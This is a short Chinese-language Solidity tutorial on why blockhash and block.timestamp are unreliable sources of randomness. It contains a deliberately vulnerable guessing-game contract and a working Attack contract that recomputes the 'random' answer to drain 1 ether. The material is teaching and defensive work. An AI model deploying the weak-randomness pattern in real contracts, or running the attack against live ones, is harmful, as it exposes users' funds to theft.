# 随机性来源

`blockhash`  和`block.timestamp` 是不可靠的随机性来源



### 漏洞示例

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/
/*
如果你能猜到 从块哈希和时间戳生成的伪随机数，你将会获得 1 ether

乍一看，似乎不可能猜出正确的数字。 但是让我们看看它是多么容易获胜。

1. Alice 用 1 个 Ether 部署 GuessTheRandomNumber 
2. Eve 部署攻击 
3. Eve 调用 Attack.attack() 并赢得 1 Ether


攻击通过简单地复制计算随机数的代码来计算正确答案。
*/

contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
```



### 预防技术

- 不要使用 `blockhash`  和`block.timestamp` 作为随机性来源

  